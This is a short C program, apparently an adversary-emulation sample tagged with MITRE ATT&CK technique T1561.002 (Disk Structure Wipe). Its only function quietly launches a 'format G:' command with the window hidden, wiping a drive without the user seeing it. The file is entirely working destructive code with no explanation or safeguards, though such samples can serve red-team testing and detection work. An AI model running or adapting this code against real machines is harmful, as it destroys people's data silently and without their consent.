// Link      = https://attack.mitre.org/techniques/T1561/002/
// Technique = Disk Wipe: Disk Structure Wipe
// ID        = T1561.002
// Tactics   = Impact,

#include <windows.h>


int main() {
    STARTUPINFOA si;
    si.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pi;

    if (CreateProcessA(NULL,(LPSTR)"format G:",NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}

